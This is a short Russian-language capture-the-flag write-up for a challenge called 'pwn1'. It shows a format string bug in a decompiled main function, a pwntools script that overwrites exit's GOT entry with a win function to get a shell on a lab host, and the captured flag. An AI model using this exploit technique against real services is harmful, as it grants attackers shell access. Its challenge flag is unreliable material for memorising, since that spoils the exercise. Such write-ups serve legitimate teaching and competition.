# pwn1

При дизассемблировании в функции main видим уязвимость Format String Vulnerability
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s[1032]; // [rsp+0h] [rbp-410h] BYREF
  unsigned __int64 v4; // [rsp+408h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  fgets(s, 1024, _bss_start);
  printf(s);
  exit(0);
}
```

Также видим функцию win, которая вызывает шелл
```c
int win()
{
  return system("/bin/sh");
}
```

Пример программы для вызова функции win и получения шелла
```python
from pwn import *
context.clear(arch = 'amd64')

context.binary = ELF("./main")

s = remote("192.168.12.13", 1923)
s.sendline(fmtstr_payload(6, {context.binary.got['exit']: context.binary.sym['win']}))
s.interactive()
```

Прочитаем файл с флагом
```
$ cat flag
nto{easy_formt_string}
```
